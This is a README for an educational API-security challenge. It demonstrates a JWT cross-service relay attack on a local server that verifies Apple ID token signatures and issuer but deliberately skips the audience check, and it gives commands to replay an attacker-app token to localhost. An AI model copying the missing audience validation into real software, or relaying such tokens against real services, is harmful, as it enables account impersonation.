# JWT Apple Token Relay Attack

This challenge demonstrates a token cross-service relay attack against a relying party that trusts Apple as its identity provider. The server verifies the RSA signature and the `iss` claim (`https://appleid.apple.com`) against Apple's public key, but never validates the `aud` claim. Any ID token minted by Apple - including one issued for a completely different, attacker-registered application - is therefore accepted, even though it was never intended for this relying party (`aud: com.victim.app`).

## How to run it

```bash
go run main.go serve
```

## How to exploit it

```bash
# Attacker registers their own app with Apple and signs in through it,
# receiving a legitimately signed ID token scoped to their app (aud: com.attacker.app)
TOKEN=$(go run main.go jwt-attacker-app)

# Relay that token to the victim relying party - the audience is never
# checked, so the token is accepted as if it were issued for it
curl -i http://localhost:8080/ -H "Authorization: Bearer $TOKEN"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
